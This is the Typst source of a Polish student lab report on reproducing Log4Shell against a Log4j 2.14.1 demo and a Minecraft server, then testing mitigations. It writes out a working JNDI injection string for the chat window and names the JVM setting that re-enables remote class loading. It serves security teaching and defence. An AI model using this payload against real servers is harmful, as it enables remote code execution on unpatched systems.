#import "common.typ": *

#set document(
  title: "PCYB Faza 1 — Log4Shell / antena izotropowa 40dBi",
  author: nazwa-zespolu,
)
#set page(margin: 2cm, numbering: "1")
#set text(lang: "pl", size: 11pt)
#set heading(numbering: "1.")
#show raw.where(block: true): it => block(
  width: 100%,
  fill: luma(245),
  inset: 8pt,
  radius: 3pt,
  it,
)

#align(center)[
  #text(size: 16pt, weight: "bold")[Raport — Faza 1]
  #v(0.3em)
  #text(size: 13pt)[Log4Shell (CVE-2021-44228) na przykładzie Minecrafta]
  #v(0.3em)
  #text(size: 11pt)[#przedmiot · semestr #semestr]
]

#meta-header(faza: "Faza 1")

= Treść zadania

Zadanie Fazy 1 (PCYB 26Z): realizacja techniczna współczesnego ataku w izolowanym
środowisku laboratoryjnym — zaprojektowanie środowiska, symulacja, zebranie dowodów
(monitoring procesów, plików, sieci) oraz raport z wnioskami.

Temat zespołu: atak RCE typu Log4Shell w kontekście serwera Minecraft oraz dema Log4j,
z demonstracją mitygacji.

= Opis merytoryczny i klasyfikacja MITRE ATT&CK

== Log4Shell

Apache Log4j 2 w podatnych wersjach (m.in. 2.14.1) wykonuje lookupy JNDI na treści
komunikatów logów. Jeśli aplikacja loguje dane kontrolowane przez użytkownika,
możliwy jest łańcuch: payload `${jndi:ldap://…}` → LDAP → referencja do klasy
i codebase HTTP → załadowanie klasy w JVM ofiary.

W labie na JVM ofiary ustawiane jest `com.sun.jndi.ldap.object.trustURLCodebase=true`,
ponieważ od JDK 8u191 domyślne ograniczenia blokują zdalne codebase — bez tej flagi
często widać jedynie próbę kontaktu z LDAP.

== Mapowanie ATT&CK

#table(
  columns: (1fr, 1.3fr, 1.8fr),
  stroke: 0.5pt,
  inset: 6pt,
  [*Tactic*], [*Technique*], [*Obserwacja w labie*],
  [Initial Access], [T1190], [Logowana treść (logger / czat MC)],
  [Execution], [T1059 / Java class load], [`Exploit` → `evidence/pwned.txt`],
  [C2], [T1071], [LDAP :1389, HTTP :8888, listener :4444],
  [Discovery], [T1082], [Baner hostname/user na listenerze],
)

= Środowisko analizy

== Oprogramowanie

#table(
  columns: (1.2fr, 2fr),
  stroke: 0.5pt,
  inset: 6pt,
  [*Składnik*], [*Wersja / źródło*],
  [JDK], [OpenJDK 11 (`pkgs.jdk11`)],
  [Log4j (podatna)], [2.14.1 — Maven Central],
  [Log4j (mitygacja)], [2.17.1 — Maven Central],
  [Minecraft server], [1.16.5 — archiwum Mojang],
  [marshalsec], [https://github.com/mbechler/marshalsec],
  [Narzędzia], [tcpdump, wireshark, strace, netcat, python3, maven],
  [Topologia], [localhost lub netns 10.42.0.0/24],
)

== Parametry sprzętowe

#table(
  columns: (1fr, 2fr),
  stroke: 0.5pt,
  inset: 6pt,
  [*CPU*], [#if sprzet.cpu == "" { text(style: "italic")[(docs/zespol.typ → sprzet)] } else { sprzet.cpu }],
  [*RAM*], [#if sprzet.ram == "" { text(style: "italic")[(docs/zespol.typ → sprzet)] } else { sprzet.ram }],
  [*GPU*], [#if sprzet.gpu == "" { text(style: "italic")[(docs/zespol.typ → sprzet)] } else { sprzet.gpu }],
  [*Dysk*], [#if sprzet.dysk == "" { text(style: "italic")[(docs/zespol.typ → sprzet)] } else { sprzet.dysk }],
  [*System*], [#if sprzet.os == "" { text(style: "italic")[(docs/zespol.typ → sprzet)] } else { sprzet.os }],
  [*Kernel*], [#if sprzet.kernel == "" { text(style: "italic")[(docs/zespol.typ → sprzet)] } else { sprzet.kernel }],
)

= Przebieg krok po kroku

== Przygotowanie

```bash
nix develop
./scripts/fetch-vendor.sh
./scripts/lab-topology.sh localhost
./scripts/verify-env.sh
```

// Zrzut: docs/figures/01-verify-env.png
// #figure(image("figures/01-verify-env.png", width: 90%), caption: [Weryfikacja środowiska])

== Infrastruktura ataku i monitoring

```bash
./scripts/build-all.sh
./scripts/start-monitor.sh
./scripts/start-http-payload.sh
./scripts/start-ldap.sh
./scripts/start-listener.sh
```

// #figure(image("figures/02-infra.png", width: 90%), caption: [LDAP / HTTP / listener])

== Trigger PoC

```bash
./scripts/run-vulnerable.sh
```

Oczekiwane: `evidence/pwned.txt` oraz baner w logu listenera.

// #figure(image("figures/03-pwned.png", width: 90%), caption: [Znacznik RCE])

== Minecraft

```bash
./scripts/start-mc-server.sh
```

Klient 1.16.5 (offline) → `127.0.0.1:25565`. Na czacie:
`${jndi:ldap://127.0.0.1:1389/Exploit}`.

// #figure(image("figures/04-minecraft.png", width: 90%), caption: [Serwer / klient MC])

== Mitygacja

```bash
./scripts/run-mitigated.sh flag
./scripts/run-mitigated.sh patched
```

Oczekiwane: brak nowego `evidence/pwned.txt`.

// #figure(image("figures/05-mitigation.png", width: 90%), caption: [Porównanie przed / po])

== Orkiestracja

```bash
./scripts/run-full-lab.sh
./scripts/collect-evidence.sh
```

= Opis załączników

#table(
  columns: (1.2fr, 2fr),
  stroke: 0.5pt,
  inset: 6pt,
  [*Ścieżka*], [*Opis*],
  [`flake.nix`, `flake.lock`], [Pin środowiska],
  [`scripts/`], [Automatyzacja labu],
  [`lab/vulnerable/`], [Cel automatyczny (Log4j 2.14.1)],
  [`lab/exploit/`], [Payload (znacznik + baner)],
  [`lab/minecraft/`], [Konfiguracja MC 1.16.5],
  [`evidence/`], [Logi i znaczniki przebiegu],
  [`docs/`], [Pit stop, raport, scenariusz],
  [`docs/figures/`], [Zrzuty ekranu],
)

= Podsumowanie

Założeniem było zbudowanie izolowanego labu Log4Shell z dowodami sieciowymi
i hostowymi oraz pokazanie mitygacji. Zrealizowano pin Nix, PoC RCE, serwer MC,
monitoring oraz porównanie przed i po zabezpieczeniu. Efekt: powtarzalny przebieg
`scripts/run-full-lab.sh` z artefaktami w `evidence/`.

= Wnioski

Lookup JNDI w Log4j 2.14.1 wraz z LDAP Reference i HTTP codebase realizuje RCE
w warunkach laboratoryjnych przy włączonym `trustURLCodebase`. Flaga
`log4j2.formatMsgNoLookups=true` oraz Log4j 2.17.1 blokują ten wektor w teście A/B.
Minecraft stanowi kontekst historyczny z 2021 r.; osobny logger ułatwia powtarzalne
dowody. Skala CVE-2021-44228 (CVSS 10.0) pokazuje znaczenie pinowania zależności
i obserwacji ruchu egress (LDAP/HTTP) z procesów JVM.

#podzial-section()
